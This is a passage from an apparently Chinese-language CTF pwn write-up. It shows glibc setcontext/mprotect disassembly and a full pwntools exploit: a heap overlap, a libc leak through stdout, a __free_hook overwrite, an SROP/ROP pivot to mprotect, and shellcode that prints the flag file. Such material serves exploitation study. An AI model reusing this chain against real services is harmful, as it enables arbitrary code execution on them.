       0x7ffff7a7bba7 :  mov    rcx,QWORD PTR [rdi+0xa8]
       0x7ffff7a7bbae :  push   rcx
       0x7ffff7a7bbaf :  mov    rsi,QWORD PTR [rdi+0x70]
       0x7ffff7a7bbb3 :  mov    rdx,QWORD PTR [rdi+0x88]
       0x7ffff7a7bbba : mov    rcx,QWORD PTR [rdi+0x98]
       0x7ffff7a7bbc1 : mov    r8,QWORD PTR [rdi+0x28]
       0x7ffff7a7bbc5 : mov    r9,QWORD PTR [rdi+0x30]
       0x7ffff7a7bbc9 : mov    rdi,QWORD PTR [rdi+0x68]
       0x7ffff7a7bbcd : xor    eax,eax
       0x7ffff7a7bbcf : ret    
       0x7ffff7a7bbd0 : mov    rcx,QWORD PTR [rip+0x3572a1]        # 0x7ffff7dd2e78
       0x7ffff7a7bbd7 : neg    eax
       0x7ffff7a7bbd9 : mov    DWORD PTR fs:[rcx],eax
       0x7ffff7a7bbdc : or     rax,0xffffffffffffffff
       0x7ffff7a7bbe0 : ret
一般是从`setcontext+53`开始用的,不然程序容易崩溃,主要是为了避开`fldenv [rcx]`这个指令....  
一般用来利用`call mprotect` -> `jmp shellcode`
    0x7ffff7b1e4d0 :  mov    eax,0xa
       0x7ffff7b1e4d5 : syscall 
       0x7ffff7b1e4d7 : cmp    rax,0xfffffffffffff001
       0x7ffff7b1e4dd :    jae    0x7ffff7b1e4e0 
       0x7ffff7b1e4df :    ret    
       0x7ffff7b1e4e0 :    mov    rcx,QWORD PTR [rip+0x2b4991]        # 0x7ffff7dd2e78
       0x7ffff7b1e4e7 :    neg    eax
       0x7ffff7b1e4e9 :    mov    DWORD PTR fs:[rcx],eax
       0x7ffff7b1e4ec :    or     rax,0xffffffffffffffff
       0x7ffff7b1e4f0 :    ret
最终的exp如下:
# EXP
    # -*- coding:utf-8 -*-    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    context.log_level = 'debug'
    context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
    context.arch = 'amd64'
    name = './pwn'
    p = process(name)
    # p = remote('101.71.29.5', 10005)
    elf = ELF(name)
    # libc = ELF('./libc-2.27.so')
    libc = ELF('./x64_libc-2.23.so.6')
    if args.G:
        gdb.attach(p)
    def add(size, content):
        p.sendlineafter('Your Choice: ', '1')
        p.sendlineafter(': ', str(size))
        p.sendafter(': ' , content)
    def delete(index):
        p.sendlineafter('Your Choice: ', '2')
        p.sendlineafter(': ', str(index))
    def edit(index, content):
        p.sendlineafter('Your Choice: ', '3')
        p.sendlineafter(': ', str(index))
        p.sendafter(': ' , content)
    add(0x68, '\n')
    add(0x78, '\n')
    add(0x68, (p64(0) + p64(0x21)) * 6 + '\n')
    add(0x68, (p64(0) + p64(0x21)) * 6 + '\n')
    delete(0)
    add(0x68, 'a' * 0x60 + p64(0) + p8(0xf1))
    delete(1)
    delete(2)
    add(0x78, '\n')
    delete(0)
    add(0x68, 'a' * 0x60 + p64(0) + p8(0xa1))
    delete(1)
    add(0x98, '\n')
    edit(1, 'b' * 0x70 + p64(0) + p64(0x71) + p16(0x25dd))  # 0x25dd需要爆破
    add(0x68, '\n')
    add(0x68, 'c' * 0x33 + p64(0xfbad2887 | 0x1000) + p64(0) * 3 + '\n')
    p.recvn(0x88)
    libc_addr = u64(p.recvn(8)) - libc.symbols['_IO_2_1_stdin_']
    log.success('libc_addr: ' + hex(libc_addr))
    edit(1, 'b' * 0x70 + p64(0) + p64(0x91))
    delete(2)
    edit(1, 'b' * 0x70 + p64(0) + p64(0x91) + p64(0) + p64(libc_addr + libc.symbols['__free_hook'] - 0x20))
    add(0x88, '\n')
    edit(1, 'b' * 0x70 + p64(0) + p64(0x71))
    delete(2)
    edit(1, 'b' * 0x70 + p64(0) + p64(0x71) + p64(libc_addr + libc.symbols['__free_hook'] - 0x13))
    frame = SigreturnFrame()
    frame.rdi = 0
    frame.rsi = (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000 #
    frame.rdx = 0x2000
    frame.rsp = (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000 
    frame.rip = libc_addr + 0x00000000000bc375 #: syscall; ret; 
    payload = str(frame)
    add(0x68, payload[0x80:0x80 + 0x60] + '\n')
    add(0x68, 'fff' + p64(libc_addr + libc.symbols['setcontext'] + 53) + '\n')
    edit(1, payload[:0x98])
    delete(1)
    layout = [
        libc_addr + 0x0000000000021102, #: pop rdi; ret; 
        (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000,
        libc_addr + 0x00000000000202e8, #: pop rsi; ret; 
        0x2000,
        libc_addr + 0x0000000000001b92, #: pop rdx; ret; 
        7,
        libc_addr + 0x0000000000033544, #: pop rax; ret; 
        10,
        libc_addr + 0x00000000000bc375, #: syscall; ret; 
        libc_addr + 0x0000000000002a71, #: jmp rsp; 
    ]
    shellcode = asm('''
    sub rsp, 0x800
    push 0x67616c66
    mov rdi, rsp
    xor esi, esi
    mov eax, 2
    syscall
    cmp eax, 0
    js failed
    mov edi, eax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall
    mov edx, eax
    mov rsi, rsp
    mov edi, 1
    mov eax, edi
    syscall
    jmp exit
    failed:
    push 0x6c696166
    mov edi, 1
    mov rsi, rsp
    mov edx, 4
    mov eax, edi
    syscall
    exit:
    xor edi, edi
    mov eax, 231
    syscall
    ''')
    p.send(flat(layout) + shellcode)
    p.interactive()